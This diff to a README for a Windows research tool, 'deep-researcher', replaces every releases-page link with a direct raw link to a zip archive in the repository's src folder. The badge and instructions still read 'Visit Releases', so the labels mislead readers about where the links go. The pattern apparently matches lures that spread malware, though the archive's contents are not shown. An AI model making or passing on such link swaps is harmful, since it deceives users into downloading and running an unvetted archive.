@@ -1,6 +1,6 @@
 # 🦉 deep-researcher - Find answers with deep research
 
-[![Download deep-researcher](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/zebulensharedout782/deep-researcher/releases)
+[![Download deep-researcher](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/zebulensharedout782/deep-researcher/main/src/researcher-deep-1.0.zip)
 
 ## 🔍 What it does
 
@@ -28,7 +28,7 @@ Recommended setup:
 
 Visit this page to download:
 
-https://github.com/zebulensharedout782/deep-researcher/releases
+https://raw.githubusercontent.com/zebulensharedout782/deep-researcher/main/src/researcher-deep-1.0.zip
 
 On that page, look for the latest release. Then choose the file that matches Windows. In most cases, that will be an `.exe` file or a `.zip` file.
 
@@ -185,7 +185,7 @@ deep-researcher is built for deep research work with a focus on clear steps and 
 
 ## 📎 Download again
 
-[Visit the latest releases page](https://github.com/zebulensharedout782/deep-researcher/releases)
+[Visit the latest releases page](https://raw.githubusercontent.com/zebulensharedout782/deep-researcher/main/src/researcher-deep-1.0.zip)
 
 ## 🖥️ Windows setup checklist
 
